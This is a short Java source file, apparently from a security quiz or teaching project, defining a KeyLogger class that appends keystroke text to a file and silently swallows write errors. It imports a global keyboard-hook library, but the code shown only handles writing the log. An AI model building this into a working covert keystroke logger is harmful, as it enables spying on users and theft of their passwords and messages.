package org.insecurity_quiz.Advanced_Security_Implementations;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;

import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.function.Function;

/**
 * KeyLogger logs keystrokes to a specified output file.
 */
public class KeyLogger {
    private Path outputFile;
    private FileWriter writer;

    /**
     * Constructs a new instance of the KeyLogger class with the specified output file name.
     *
     * @param outputFileName the name of the file to write the key logs to.
     * @throws IOException if an I/O error occurs while opening or creating the file.
     */
    public KeyLogger(String outputFileName) throws IOException {
        outputFile = Paths.get(outputFileName);
        writer = new FileWriter(outputFile.toString(), true);
    }

    /**
     * Logs the specified key text to the output file.
     *
     * @param keytext the text of the key to log.
     * @return true if the key was successfully logged, false otherwise.
     */
    public Boolean logKey(String keytext) {
        try {
            if (keytext.length() > 1) {
                writer.write("[" + keytext + "]");
            } else {
                writer.write(keytext);
            }
            writer.flush();
            return true;
        }
        catch (Exception e) {
            //Suppress the exception for now.
        }
        return false;
    }
}
